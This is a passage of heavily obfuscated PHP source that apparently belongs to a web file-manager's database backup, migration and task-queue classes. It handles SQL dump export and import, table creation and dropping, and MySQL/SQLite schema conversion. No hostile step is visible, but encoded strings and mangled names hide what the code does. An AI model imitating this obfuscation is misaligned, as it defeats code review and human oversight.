$°ºê†ª¡->execute("\163\150\157\167\40\x64\x61\x74\x61\142\x61\x73\x65\x73\40\x6c\x69\153\x65\40\x27{$·¤Ÿ‘‡}\47"); } catch (Exception $ù¡Õ˜Û) { } if (!$ìñëù‰¦) { $°ºê†ª¡->execute("\x63\162\x65\x61\164\145\x20\x64\141\x74\141\x62\141\x73\x65\40\140{$·¤Ÿ‘‡}\x60"); } $”Û¢Òá¤[$úş‰Ã—½[1015]] = $·¤Ÿ‘‡; if ($”Û¢Òá¤[$úş‰Ã—½[1010]] == $úş‰Ã—½[1007]) { $”Û¢Òá¤[$úş‰Ã—½[1016]] .= $úş‰Ã—½[1102] . $·¤Ÿ‘‡; } $this->database = $”Û¢Òá¤; $°ºê†ª¡->execute("\x75\163\x65\40\x60{$·¤Ÿ‘‡}\140"); return $°ºê†ª¡; } public function createTable($šìÆÌÏÙ, &$‘»ò‘¼š) { $áä²øŒÑ =& $_SERVER[³½¬ÚË¯]; if (!IO::exist($šìÆÌÏÙ)) { ActionCall($áä²øŒÑ[1103], !0, 0); show_json(LNG($áä²øŒÑ[1104]), !1); } $®ú¡Ï’¾ = $this->model()->db(); $“‹ø™—Š = sqlSplit(IO::getContent($šìÆÌÏÙ)); foreach ($“‹ø™—Š as $®ß¥Šø) { $ŞÑÒµ = stripos($®ß¥Šø, $áä²øŒÑ[1105]) === 0; if ($ŞÑÒµ) { $‘»ò‘¼š->task[$áä²øŒÑ[822]] += 1; } $®ú¡Ï’¾->execute($®ß¥Šø); if ($ŞÑÒµ) { preg_match($áä²øŒÑ[1106], $®ß¥Šø, $•Ü¾ü¯·); $‘»ò‘¼š->task[$áä²øŒÑ[1107]] = $•Ü¾ü¯·[1]; $‘»ò‘¼š->update(1); } } } public function insertTable($€¤×ğ´, &$„¸Ìõ¡õ) { $æì®“šÉ =& $_SERVER[³½¬ÚË¯]; $ß¸™á’İ = $this->model()->db(); $»ä±ŒØ² = $Š½«çü¼ ? array($Š½«çü¼) : $ß¸™á’İ->getTables(); foreach ($€¤×ğ´ as $ÕÕ¹í®‘) { $Š½«çü¼ = basename($ÕÕ¹í®‘, $æì®“šÉ[824]); if (!in_array($Š½«çü¼, $»ä±ŒØ²)) { continue; } $„¸Ìõ¡õ->task[$æì®“šÉ[1107]] = $Š½«çü¼; if (get_filesize($ÕÕ¹í®‘) == 0) { continue; } $ÇîÁ„ßŸ = $this->sqlToDb($ÕÕ¹í®‘, $„¸Ìõ¡õ); if (!$ÇîÁ„ßŸ) { ActionCall($æì®“šÉ[1103], !0, 0); show_json(LNG($æì®“šÉ[1108]) . "\x5b{$Š½«çü¼}\135", !1); } } } public function sqlFromDb($àƒÖ³âº, $Á¦µğ¼ğ, &$§©ºÏßà, $ßÙ´ÒÄã = '') { if ($§©ºÏßà) { $§©ºÏßà->task[$_SERVER[³½¬ÚË¯][1107]] = $àƒÖ³âº; } $¬êõ™œ = $this->model($àƒÖ³âº); $Ä‡É‡‰Ò = 0; $ãœô£İ° = 0; $§—Æ‰À = 10000; $òòôÚ“Ş = fopen($Á¦µğ¼ğ, $_SERVER[³½¬ÚË¯][1109]); $£€™»ÆÁ = $¬êõ™œ->getPk(); $ØÀ•ùË‰ = $¬êõ™œ->getDbFields(); $£ñËçÒé = $_SERVER[³½¬ÚË¯][12]; if ($GLOBALS[$_SERVER[³½¬ÚË¯][823]] && in_array($àƒÖ³âº, array($_SERVER[³½¬ÚË¯][1110], $_SERVER[³½¬ÚË¯][1111]))) { $£ñËçÒé = $àƒÖ³âº; } do { $¤à€ı´â = array($£€™»ÆÁ => array($_SERVER[³½¬ÚË¯][1057], $ãœô£İ°)); $“‘Òş¨ = $¬êõ™œ->where($¤à€ı´â)->field($ØÀ•ùË‰)->order($£€™»ÆÁ . $_SERVER[³½¬ÚË¯][1112])->limit($§—Æ‰À)->select(); $“‘Òş¨ = !empty($“‘Òş¨) ? $“‘Òş¨ : array(); if (!($¥–İşÆæ = count($“‘Òş¨))) { break; } $óÙ¢¶ø‡ = end($“‘Òş¨); $ãœô£İ° = $óÙ¢¶ø‡[$£€™»ÆÁ]; $©ôÂ¶î‡ = array(); foreach ($“‘Òş¨ as $ÍêŠ”ùî) { if ($£ñËçÒé) { if ($àƒÖ³âº == $_SERVER[³½¬ÚË¯][1110]) { if ($ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][33]] == $_SERVER[³½¬ÚË¯][1113]) { $‹üÙÍ…ö = json_decode($ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][418]], !0); if ($‹üÙÍ…ö[$_SERVER[³½¬ÚË¯][32]] == $GLOBALS[$_SERVER[³½¬ÚË¯][823]] && $‹üÙÍ…ö[$_SERVER[³½¬ÚË¯][786]] != 1) { continue; } } } else { if ($ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][33]] == $_SERVER[³½¬ÚË¯][1114] && $ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][94]] == $_SERVER[³½¬ÚË¯][815]) { continue; } } } if ($ßÙ´ÒÄã) { $ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][84]] = "\x7b\151\x6f\72{$ßÙ´ÒÄã}\175" . substr($ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][84]], strlen("\173\151\x6f\x3a{$ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][853]]}\x7d")); $ÍêŠ”ùî[$_SERVER[³½¬ÚË¯][853]] = $ßÙ´ÒÄã; } $©ôÂ¶î‡[] = $_SERVER[³½¬ÚË¯][1115] . $this->sqlEncode($ÍêŠ”ùî) . $_SERVER[³½¬ÚË¯][1116]; } $ù®†÷ÖŒ = "\x49\x4e\x53\105\122\124\x20\x49\116\124\117\40\140{$àƒÖ³âº}\140\x20\x28\x60" . implode($_SERVER[³½¬ÚË¯][1117], $ØÀ•ùË‰) . $_SERVER[³½¬ÚË¯][1118]; fwrite($òòôÚ“Ş, $ù®†÷ÖŒ . implode($_SERVER[³½¬ÚË¯][1119], $©ôÂ¶î‡) . $_SERVER[³½¬ÚË¯][71] . PHP_EOL); $Ä‡É‡‰Ò += $¥–İşÆæ; if ($§©ºÏßà) { $§©ºÏßà->update($¥–İşÆæ); } } while ($§—Æ‰À == $¥–İşÆæ); fclose($òòôÚ“Ş); return $Ä‡É‡‰Ò; } public function sqlToDb($ÖêùË†ü, &$¾ÜÛâô) { $ôß³úúü =& $_SERVER[³½¬ÚË¯]; $Å÷È§î¹ = $this->model()->db(); $—‘˜ŠŠİ = @fopen($ÖêùË†ü, $ôß³úúü[1120]); if (!$—‘˜ŠŠİ) { return !1; } $ĞıŒÂ™® = 0; $•ƒîË“å = $ôß³úúü[12]; $Ï˜¼ºæ² = array(); $Û¦˜ÇÛã = $this->dbType(); $‹õ•Ç´‡ = $Û¦˜ÇÛã == $ôß³úúü[13] ? 500 : 2000; $€õòšÑ = basename($ÖêùË†ü, $ôß³úúü[824]); $ÖÄâ¼ŞÈ = 0; $Ç®ºñˆ§ = 4194304 - 104858; $ùÖ‰Ú÷ = 1000000 - 104858; while (!feof($—‘˜ŠŠİ)) { $ì³³Ñº· = trim(fgets($—‘˜ŠŠİ)); if (!$ì³³Ñº·) { continue; } $Î¯ú½¢ = $this->sqlDecode($ì³³Ñº·, $Û¦˜ÇÛã, $€õòšÑ); if (stripos($Î¯ú½¢, $ôß³úúü[399]) === 0) { if (!$•ƒîË“å) { $•ƒîË“å = $Î¯ú½¢ . $ôß³úúü[53]; } continue; } if ($¾ÜÛâô) { $¾ÜÛâô->task[$ôß³úúü[822]] += 1; } $ĞıŒÂ™®++; $Ï˜¼ºæ²[] = rtrim(rtrim(trim($Î¯ú½¢), $ôß³úúü[50]), $ôß³úúü[71]); $ñ­¡‚Åñ = null; $ï›şŸˆ = strlen($Î¯ú½¢); $ÖÄâ¼ŞÈ += $ï›şŸˆ; if ($ÖÄâ¼ŞÈ >= ($‹õ•Ç´‡ == 500 ? $ùÖ‰Ú÷ : $Ç®ºñˆ§)) { $ñ­¡‚Åñ = array_pop($Ï˜¼ºæ²); if ($ĞıŒÂ™® > 1) { $ĞıŒÂ™®--; } } if ($ĞıŒÂ™® >= $‹õ•Ç´‡ || $ñ­¡‚Åñ) { $Î¯ú½¢ = $•ƒîË“å . implode($ôß³úúü[50], $Ï˜¼ºæ²); if (!$Å÷È§î¹->execute($Î¯ú½¢)) { return !1; } if ($¾ÜÛâô) { $¾ÜÛâô->update($ĞıŒÂ™®); } $Ï˜¼ºæ² = array(); $ĞıŒÂ™® = 0; $ÖÄâ¼ŞÈ = 0; if ($ñ­¡‚Åñ) { $Ï˜¼ºæ² = array($ñ­¡‚Åñ); $ĞıŒÂ™® = 1; $ÖÄâ¼ŞÈ = $ï›şŸˆ; } } } fclose($—‘˜ŠŠİ); if (!empty($Ï˜¼ºæ²)) { $Î¯ú½¢ = $•ƒîË“å . implode($ôß³úúü[50], $Ï˜¼ºæ²); if (!$Å÷È§î¹->execute($Î¯ú½¢)) { return !1; } if ($¾ÜÛâô) { $¾ÜÛâô->update($ĞıŒÂ™®); } } return !0; } public function dropTable($°òµ‡€ = null) { $ò´êê¶ = $this->model()->db(); $í²¢£›‡ = $°òµ‡€ ? array($°òµ‡€) : $ò´êê¶->getTables(); if (!$í²¢£›‡) { return; } foreach ($í²¢£›‡ as $°òµ‡€) { if ($°òµ‡€) { $°òµ‡€ = strtolower($°òµ‡€); } else { continue; } $ò´êê¶->execute("\x64\162\x6f\x70\40\164\141\142\x6c\145\40\151\146\40\145\x78\x69\x73\x74\x73\40\140{$°òµ‡€}\x60"); } } private function sqlEncode($Ë¬–£õ—) { $é­ƒöüò =& $_SERVER[³½¬ÚË¯]; $Ğ¢¤ï‡Ç = array(); foreach ($Ë¬–£õ— as $äëåúŠí) { if (is_array($äëåúŠí)) { $äëåúŠí = json_encode_force($äëåúŠí); } $äëåúŠí = addslashes($äëåúŠí); $äëåúŠí = str_replace(array($é­ƒöüò[1121], $é­ƒöüò[246]), array($é­ƒöüò[1122], $é­ƒöüò[1123]), $äëåúŠí); $Ğ¢¤ï‡Ç[] = str_replace($é­ƒöüò[58], $é­ƒöüò[1124], $äëåúŠí); } return $é­ƒöüò[58] . implode($é­ƒöüò[1125], $Ğ¢¤ï‡Ç) . $é­ƒöüò[58]; } private function sqlDecode($Çç¥ŞÄù, $„Î‹ƒ…ñ, $÷¿ƒ•ç‡ = '') { $Àü×¥’ =& $_SERVER[³½¬ÚË¯]; $Çç¥ŞÄù = str_replace(array($Àü×¥’[1122], $Àü×¥’[1123]), array($Àü×¥’[1121], $Àü×¥’[246]), $Çç¥ŞÄù); if ($„Î‹ƒ…ñ == $Àü×¥’[13]) { return $÷¿ƒ•ç‡ != $Àü×¥’[1126] ? stripslashes($Çç¥ŞÄù) : $Çç¥ŞÄù; } if ($÷¿ƒ•ç‡ == $Àü×¥’[1126]) { $Çç¥ŞÄù = str_replace($Àü×¥’[1127], $Àü×¥’[118], stripslashes($Çç¥ŞÄù)); } return $Çç¥ŞÄù; } public function getSqlFile($ãşöé‚ò = '') { $íê„ÅûË =& $_SERVER[³½¬ÚË¯]; $–Ñˆã¸ = $this->dbType(!0); $¦ï‹³À³ = CONTROLLER_DIR . "\x69\x6e\163\x74\141\154\154\57\144\141\x74\x61\57{$–Ñˆã¸}\x2e\x73\x71\154"; $ıâÖ¼†Ç = file_get_contents($¦ï‹³À³); $Üò‘ß‹ı = $íê„ÅûË[1128] . ($–Ñˆã¸ == $íê„ÅûË[840] ? $íê„ÅûË[1129] : $íê„ÅûË[1130]) . $íê„ÅûË[1131]; preg_match_all($Üò‘ß‹ı, $ıâÖ¼†Ç, $é•¡ã÷); $†ŞÛ¦Ôê = $é•¡ã÷[1]; $à¤í²¼ó = $this->model()->db(); $µšİ³Ò† = $à¤í²¼ó->getTables(); $ßŸ§õÓè = TEMP_FILES . $íê„ÅûË[1132] . date($íê„ÅûË[255]) . $íê„ÅûË[8]; del_dir($ßŸ§õÓè); mk_dir($ßŸ§õÓè); $áñ‡‚ë• = $ßŸ§õÓè . $íê„ÅûË[1133]; $š®éñòÔ = $ßŸ§õÓè . $íê„ÅûË[1134]; $Ô„ˆ«ü = $–Ñˆã¸ == $íê„ÅûË[13] ? $íê„ÅûË[840] : $íê„ÅûË[13]; IO::copy(CONTROLLER_DIR . "\x69\x6e\x73\164\141\154\x6c\57\144\141\x74\x61\x2f{$Ô„ˆ«ü}\x2e\x73\161\154", $ßŸ§õÓè); @touch($ßŸ§õÓè . $–Ñˆã¸ . $íê„ÅûË[824]); $Ñ¡ñÀÍË = fopen($áñ‡‚ë•, $íê„ÅûË[1109]); $‹‘íÒäÊ = fopen($š®éñòÔ, $íê„ÅûË[1109]); if ($–Ñˆã¸ == $íê„ÅûË[13]) { $µšİ³Ò† = array_diff($µšİ³Ò†, array($íê„ÅûË[820], $íê„ÅûË[821])); $§®ŠõÕÛ = array($íê„ÅûË[1135], $íê„ÅûË[1136], $íê„ÅûË[1137]); fwrite($‹‘íÒäÊ, implode(PHP_EOL, $§®ŠõÕÛ) . PHP_EOL . PHP_EOL); foreach ($µšİ³Ò† as $¯ùŸ‡Œ‚) { $â¦ğÙ˜ = $this->sqlFromSqlite($¯ùŸ‡Œ‚); if (!$â¦ğÙ˜[$íê„ÅûË[13]]) { continue; } fwrite($‹‘íÒäÊ, $â¦ğÙ˜[$íê„ÅûË[13]] . PHP_EOL . PHP_EOL); if (!in_array($¯ùŸ‡Œ‚, $†ŞÛ¦Ôê)) { fwrite($Ñ¡ñÀÍË, $â¦ğÙ˜[$íê„ÅûË[840]] . PHP_EOL . PHP_EOL); } } } else { foreach ($µšİ³Ò† as $¯ùŸ‡Œ‚) { $â¦ğÙ˜ = $this->sqlFromMysql($¯ùŸ‡Œ‚); if (!$â¦ğÙ˜[$íê„ÅûË[840]]) { continue; } fwrite($Ñ¡ñÀÍË, $â¦ğÙ˜[$íê„ÅûË[840]] . PHP_EOL . PHP_EOL); if (!in_array($¯ùŸ‡Œ‚, $†ŞÛ¦Ôê)) { fwrite($‹‘íÒäÊ, $â¦ğÙ˜[$íê„ÅûË[13]] . PHP_EOL . PHP_EOL); } } } fclose($Ñ¡ñÀÍË); fclose($‹‘íÒäÊ); $ıâÖ¼†Ç = array($íê„ÅûË[840] => $áñ‡‚ë•, $íê„ÅûË[13] => $š®éñòÔ); return $ãşöé‚ò ? $ıâÖ¼†Ç[$ãşöé‚ò] : $ıâÖ¼†Ç; } public function dbType($´§¿ÍÒÔ = false) { $õãÜ†×¯ =& $_SERVER[³½¬ÚË¯]; $º°ê¹š… = $´§¿ÍÒÔ ? $GLOBALS[$õãÜ†×¯[6]][$õãÜ†×¯[21]] : $this->database; $º°ê¹š… = array_change_key_case($º°ê¹š…); $œúùªÆ = $º°ê¹š…[$õãÜ†×¯[1010]]; if ($œúùªÆ == $õãÜ†×¯[1007]) { $ãó´×¤ = explode($õãÜ†×¯[4], $º°ê¹š…[$õãÜ†×¯[1016]]); $œúùªÆ = $ãó´×¤[0]; } $ú­“ï´ó = array($õãÜ†×¯[1138] => $õãÜ†×¯[13], $õãÜ†×¯[955] => $õãÜ†×¯[840]); if (isset($ú­“ï´ó[$œúùªÆ])) { $œúùªÆ = $ú­“ï´ó[$œúùªÆ]; } return $œúùªÆ; } public function sqlFromMysql($Ïê™Êª, $ÆšĞ¤œæ = '') { $„ë±¤È× =& $_SERVER[³½¬ÚË¯]; $›”•™¾À = $this->model()->db(); $†Í†Èç = $›”•™¾À->query($„ë±¤È×[1139] . $Ïê™Êª . $„ë±¤È×[429]); if (!$†Í†Èç || !$†Í†Èç[0]) { return !1; } $»†ÆÜ¢Ô = _get($†Í†Èç[0], $„ë±¤È×[1140], $„ë±¤È×[12]); if (!$»†ÆÜ¢Ô) { return !1; } $¸¨›²·— = "\104\122\117\x50\40\x54\101\102\x4c\105\x20\111\x46\40\105\130\x49\123\124\123\x20\x60{$Ïê™Êª}\x60\73" . PHP_EOL . $»†ÆÜ¢Ô . $„ë±¤È×[71]; if ($ÆšĞ¤œæ && $ÆšĞ¤œæ == $„ë±¤È×[840]) { return $¸¨›²·—; } $ª”——Ğ¢ = array_change_key_case($GLOBALS[$„ë±¤È×[6]][$„ë±¤È×[21]]); $ºƒˆíë‚ = $ª”——Ğ¢[$„ë±¤È×[1015]]; $äœñ‚«Š = $„ë±¤È×[1141] . $ºƒˆíë‚ . $„ë±¤È×[1142] . $Ïê™Êª . $„ë±¤È×[58]; $ÄÌÆÂ…­ = $„ë±¤È×[1143] . $Ïê™Êª . $„ë±¤È×[943]; $‹‹”¢¯ê = $›”•™¾À->query($äœñ‚«Š); if (empty($‹‹”¢¯ê)) { $á¥‡Ö¶² = array($„ë±¤È×[840] => $„ë±¤È×[12], $„ë±¤È×[13] => $„ë±¤È×[12]); return $ÆšĞ¤œæ ? $á¥‡Ö¶²[$ÆšĞ¤œæ] : $á¥‡Ö¶²; } $Û¶ãì×‘ = $›”•™¾À->query($ÄÌÆÂ…­); $˜ÙÙÃê– = $„ë±¤È×[12]; $›ÆÜ–¢ñ = array(); foreach ($Û¶ãì×‘ as $»öŸÛİ) { if (!$˜ÙÙÃê– && $»öŸÛİ[$„ë±¤È×[1144]] == $„ë±¤È×[1145]) { $˜ÙÙÃê– = $»öŸÛİ[$„ë±¤È×[1146]]; } if (isset($›ÆÜ–¢ñ[$»öŸÛİ[$„ë±¤È×[1144]]])) { $›ÆÜ–¢ñ[$»öŸÛİ[$„ë±¤È×[1144]]][$„ë±¤È×[1147]][] = $»öŸÛİ[$„ë±¤È×[1146]]; continue; } $›ÆÜ–¢ñ[$»öŸÛİ[$„ë±¤È×[1144]]] = array($„ë±¤È×[1148] => $»öŸÛİ[$„ë±¤È×[1144]], $„ë±¤È×[1147] => array($»öŸÛİ[$„ë±¤È×[1146]]), $„ë±¤È×[1149] => $»öŸÛİ[$„ë±¤È×[1150]] == $„ë±¤È×[88] ? 0 : 1); } $ÚÚàÃÆö = array(); foreach ($›ÆÜ–¢ñ as $»öŸÛİ) { $ïÑÊ²£¤ = $»öŸÛİ[$„ë±¤È×[1148]] == $„ë±¤È×[1145]; $§Ø±úÑğ = array($„ë±¤È×[1151], $»öŸÛİ[$„ë±¤È×[1149]] == $„ë±¤È×[88] && !$ïÑÊ²£¤ ? $„ë±¤È×[1152] : $„ë±¤È×[12], $„ë±¤È×[1153], $„ë±¤È×[1154] . $Ïê™Êª . $„ë±¤È×[11] . ($ïÑÊ²£¤ ? $„ë±¤È×[1155] : $»öŸÛİ[$„ë±¤È×[1148]]) . $„ë±¤È×[118], $„ë±¤È×[1156], $„ë±¤È×[118] . $Ïê™Êª . $„ë±¤È×[118], $„ë±¤È×[1157] . implode($„ë±¤È×[1158], $»öŸÛİ[$„ë±¤È×[1147]]) . $„ë±¤È×[1159]); $ÚÚàÃÆö[] = implode($„ë±¤È×[53], $§Ø±úÑğ) . $„ë±¤È×[71]; } $’ˆñ÷í = array(); $é¸Ûı¨ = array($„ë±¤È×[1160] => $„ë±¤È×[1161], $„ë±¤È×[1161] => $„ë±¤È×[1161], $„ë±¤È×[332] => $„ë±¤È×[359], $„ë±¤È×[331] => $„ë±¤È×[359]); foreach ($‹‹”¢¯ê as $»öŸÛİ) { $§Ø±úÑğ = array($„ë±¤È×[118] . $»öŸÛİ[$„ë±¤È×[1162]] . $„ë±¤È×[118], isset($é¸Ûı¨[$»öŸÛİ[$„ë±¤È×[1163]]]) ? $é¸Ûı¨[$»öŸÛİ[$„ë±¤È×[1163]]] : $»öŸÛİ[$„ë±¤È×[1164]], $»öŸÛİ[$„ë±¤È×[1165]] == $„ë±¤È×[941] ? $„ë±¤È×[1166] : $„ë±¤È×[1167], $»öŸÛİ[$„ë±¤È×[1162]] == $˜ÙÙÃê– ? $„ë±¤È×[1168] : $„ë±¤È×[12], $»öŸÛİ[$„ë±¤È×[992]] ? strtoupper(str_replace($„ë±¤È×[11], $„ë±¤È×[12], $»öŸÛİ[$„ë±¤È×[992]])) : $„ë±¤È×[12]); $’ˆñ÷í[] = trim(implode($„ë±¤È×[53], $§Ø±úÑğ)); } $öÇ¸¶×Ş = array($„ë±¤È×[1169] . $Ïê™Êª . $„ë±¤È×[1170], $„ë±¤È×[1171] . $Ïê™Êª . $„ë±¤È×[1172], implode($„ë±¤È×[50] . PHP_EOL, $’ˆñ÷í), $„ë±¤È×[989]); $ªÛ´­¼¼ = implode(PHP_EOL, array_merge($öÇ¸¶×Ş, $ÚÚàÃÆö)); if ($ÆšĞ¤œæ && $ÆšĞ¤œæ == $„ë±¤È×[13]) { return $ªÛ´­¼¼; } $á¥‡Ö¶² = array($„ë±¤È×[840] => $¸¨›²·—, $„ë±¤È×[13] => $ªÛ´­¼¼); return $ÆšĞ¤œæ ? $á¥‡Ö¶²[$ÆšĞ¤œæ] : $á¥‡Ö¶²; } public function sqlFromSqlite($§‹í“¸õ, $¾ŞßùÒ = '') { $’˜‰ÍÜ =& $_SERVER[³½¬ÚË¯]; $ôˆõì‰» = $this->model()->db(); $†şè‰‚õ = "\x50\122\101\107\115\x41\x20\x54\101\x42\x4c\x45\137\111\116\106\117\x20\x28\x27{$§‹í“¸õ}\x27\x29"; $şöí–— = "\x53\105\x4c\105\103\x54\40\x2a\40\106\x52\117\x4d\x20\x73\x71\x6c\151\164\145\x5f\x6d\x61\x73\x74\145\x72\40\127\110\x45\122\105\40\164\142\x6c\137\x6e\141\155\145\40\x3d\40\47{$§‹í“¸õ}\x27"; $ô²¡ëË = $ôˆõì‰»->query($†şè‰‚õ); if (empty($ô²¡ëË)) { $ÄËŸÚò = array($’˜‰ÍÜ[840] => $’˜‰ÍÜ[12], $’˜‰ÍÜ[13] => $’˜‰ÍÜ[12]); return $¾ŞßùÒ ? $ÄËŸÚò[$¾ŞßùÒ] : $ÄËŸÚò; } $Ó—‡¯¥ï = $ôˆõì‰»->query($şöí–—); $ı·ÏÏ¶ = $êå¥¶Ñ  = array(); foreach ($Ó—‡¯¥ï as $– Êú¤) { if ($– Êú¤[$’˜‰ÍÜ[33]] == $’˜‰ÍÜ[323]) { $ı·ÏÏ¶[] = $– Êú¤[$’˜‰ÍÜ[1173]]; } else { $êå¥¶Ñ [$– Êú¤[$’˜‰ÍÜ[32]]] = $– Êú¤[$’˜‰ÍÜ[1173]]; } } $üÌ§çì¦ = array_merge(array($’˜‰ÍÜ[1169] . $§‹í“¸õ . $’˜‰ÍÜ[118]), $ı·ÏÏ¶, array_values($êå¥¶Ñ )); $üÌ§çì¦ = implode($’˜‰ÍÜ[71] . PHP_EOL, $üÌ§çì¦) . $’˜‰ÍÜ[71]; if ($¾ŞßùÒ && $¾ŞßùÒ == $’˜‰ÍÜ[13]) { return $üÌ§çì¦; } $½ÆÉÓ› = array(); $íö²Í§Â = array($’˜‰ÍÜ[1161] => $’˜‰ÍÜ[1174], $’˜‰ÍÜ[359] => $’˜‰ÍÜ[1175]); $š¼ÏÉÅó = $’˜‰ÍÜ[12]; foreach ($ô²¡ëË as $– Êú¤) { if ($– Êú¤[$’˜‰ÍÜ[57]] == $’˜‰ÍÜ[88]) { $š¼ÏÉÅó = $– Êú¤[$’˜‰ÍÜ[32]]; } $æªÉ”Æ = array($’˜‰ÍÜ[429] . $– Êú¤[$’˜‰ÍÜ[32]] . $’˜‰ÍÜ[429], isset($íö²Í§Â[$– Êú¤[$’˜‰ÍÜ[33]]]) ? $íö²Í§Â[$– Êú¤[$’˜‰ÍÜ[33]]] : $– Êú¤[$’˜‰ÍÜ[33]], $– Êú¤[$’˜‰ÍÜ[35]] == $’˜‰ÍÜ[88] ? $’˜‰ÍÜ[1166] : $’˜‰ÍÜ[1176] . $– Êú¤[$’˜‰ÍÜ[56]], $– Êú¤[$’˜‰ÍÜ[57]] == $’˜‰ÍÜ[88] ? $’˜‰ÍÜ[1177] : $’˜‰ÍÜ[12]); $½ÆÉÓ›[] = trim(implode($’˜‰ÍÜ[53], $æªÉ”Æ)); } foreach ($êå¥¶Ñ  as $è¦Ÿ®·Â => $æÓ†ÍôÑ) { $´€”¸¬§ = str_replace($’˜‰ÍÜ[1178] . $§‹í“¸õ . $’˜‰ÍÜ[11], $’˜‰ÍÜ[12], $è¦Ÿ®·Â); $ŠùîêÈ€ = str_replace(array($’˜‰ÍÜ[118], $’˜‰ÍÜ[1000]), $’˜‰ÍÜ[429], substr($æÓ†ÍôÑ, stripos($æÓ†ÍôÑ, $’˜‰ÍÜ[304]))); if ($´€”¸¬§ == $’˜‰ÍÜ[1155]) { $õ•Å÷šê = $’˜‰ÍÜ[1179] . $š¼ÏÉÅó . $’˜‰ÍÜ[1180]; } else { $õ•Å÷šê = (stripos($´€”¸¬§, $’˜‰ÍÜ[11]) ? $’˜‰ÍÜ[1181] : $’˜‰ÍÜ[12]) . ($’˜‰ÍÜ[1182] . $´€”¸¬§ . $’˜‰ÍÜ[1183] . $ŠùîêÈ€); } $½ÆÉÓ›[] = $õ•Å÷šê; } $îÀ÷î¬ = array($’˜‰ÍÜ[1184] . $§‹í“¸õ . $’˜‰ÍÜ[1185], $’˜‰ÍÜ[1186] . $§‹í“¸õ . $’˜‰ÍÜ[1187], implode($’˜‰ÍÜ[50] . PHP_EOL, $½ÆÉÓ›), $’˜‰ÍÜ[1188]); $æÍæÆÆš = implode(PHP_EOL, $îÀ÷î¬); if ($¾ŞßùÒ && $¾ŞßùÒ == $’˜‰ÍÜ[840]) { return $æÍæÆÆš; } $ÄËŸÚò = array($’˜‰ÍÜ[840] => $æÍæÆÆš, $’˜‰ÍÜ[13] => $üÌ§çì¦); return $¾ŞßùÒ ? $ÄËŸÚò[$¾ŞßùÒ] : $ÄËŸÚò; } } goto Aõ³ê‡‡§Ê; BôÌéÏ‰: class TaskQueue { const MAX_LENGTH = 2000; const QUEUE_LENGTH = "\x74\141\x73\x6b\121\165\145\165\x65\x4c\145\156\x67\x74\x68"; const QUEUE_DATA = "\x74\141\x73\153\121\165\145\x75\145\104\141\164\141"; const QUEUE_TIME = "\x74\141\163\x6b\x51\x75\x65\x75\145\x4c\x61\x73\x74\x52\165\156"; const QUEUE_THREAD = "\x74\141\x73\153\121\x75\x65\x75\x65\124\x68\x72\145\x61\x64"; public static $listData = false; public static $listDataAdd = false; public static function initTask() { } public static function add($ô î÷«®, $Õ›ª†ï¸ = array(), $Ø¯†¾¯¥ = '', $íàÒíÇû = '') { $§ÙÍ¬ =& $_SERVER[³½¬ÚË¯]; if (self::$listData === !1) { self::$listData = self::getAll(); self::$listDataAdd = array(); } if (count(self::$listData) >= self::MAX_LENGTH) { return !1; } if ($íàÒíÇû && array_find_by_field(self::$listData, $§ÙÍ¬[94], $íàÒíÇû)) { return !0; } if ($íàÒíÇû && array_find_by_field(self::$listDataAdd, $§ÙÍ¬[94], $íàÒíÇû)) { return !0; } self::$listDataAdd[] = array($§ÙÍ¬[308] => $ô î÷«®, $§ÙÍ¬[1788] => $Õ›ª†ï¸, $§ÙÍ¬[494] => $Ø¯†¾¯¥, $§ÙÍ¬[94] => $íàÒíÇû); return !0; } public static function addSubmit() { $İÈ›íÅ =& $_SERVER[³½¬ÚË¯]; if (!self::$listDataAdd || count(self::$listDataAdd) == 0) { return; } self::setAll(array_merge(self::getAll(), self::$listDataAdd)); write_log($İÈ›íÅ[1789] . json_encode_force(array_to_keyvalue(self::$listDataAdd, $İÈ›íÅ[12], $İÈ›íÅ[494])), $İÈ›íÅ[185]); self::$listData = !1; self::$listDataAdd = !1; } public static function addNow($‰¸­½…”, $ø¶¯§¾ = array(), $¼ëƒïî = '', $˜õ‡¿…ƒ = '') { $Ç·¦äÈ½ =& $_SERVER[³½¬ÚË¯]; if (self::count() >= self::MAX_LENGTH) { return !1; } $çåÖ¤Æ— = self::getAll(); if ($˜õ‡¿…ƒ && array_find_by_field($çåÖ¤Æ—, $Ç·¦äÈ½[94], $˜õ‡¿…ƒ)) { return !0; } $çåÖ¤Æ—[] = array($Ç·¦äÈ½[308] => $‰¸­½…”, $Ç·¦äÈ½[1788] => $ø¶¯§¾, $Ç·¦äÈ½[494] => $¼ëƒïî, $Ç·¦äÈ½[94] => $˜õ‡¿…ƒ); self::setAll($çåÖ¤Æ—); write_log($Ç·¦äÈ½[1789] . $¼ëƒïî, $Ç·¦äÈ½[185]); return !0; } public static function run() { $êíú«¥™ =& $_SERVER[³½¬ÚË¯]; $ÓÛ€ûğ = self::getAll(); $Ü¤¶½àõ = array_shift($ÓÛ€ûğ); if (!$Ü¤¶½àõ) { return !1; } self::setAll($ÓÛ€ûğ); $òü¼Ÿ÷– = timeFloat(); $Üßğ´‡® = $êíú«¥™[12]; try { $Üßğ´‡® = Hook::apply($Ü¤¶½àõ[$êíú«¥™[308]], $Ü¤¶½àõ[$êíú«¥™[1788]]); } catch (Exception $è´êîÜ) { write_log($è´êîÜ, $êíú«¥™[1225]); } $¯³ÕËâ = number_format(timeFloat() - $òü¼Ÿ÷–, 3) . $êíú«¥™[1706]; if ($Üßğ´‡® && is_string($Üßğ´‡®)) { $¯³ÕËâ = $¯³ÕËâ . $êíú«¥™[1790] . $Üßğ´‡®; } write_log($êíú«¥™[1791] . $Ü¤¶½àõ[$êíú«¥™[494]] . $êíú«¥™[1792] . $¯³ÕËâ, $êíú«¥™[185]); Cache::set(self::QUEUE_TIME, time(), 3600 * 24 * 30); return !0; } public static function runThread() { $¬ßíÜº’ =& $_SERVER[³½¬ÚË¯]; $¢¹÷ü¯ = self::threadCount() + 1; if ($¢¹÷ü¯ > 3 || !self::count()) { return; } write_log($¬ßíÜº’[1793] . $¢¹÷ü¯, $¬ßíÜº’[185]); Cache::set(self::QUEUE_THREAD, $¢¹÷ü¯, 3600 * 24); AutoTask::clearUserStatus(); while (!0) { if (!self::run()) { break; } 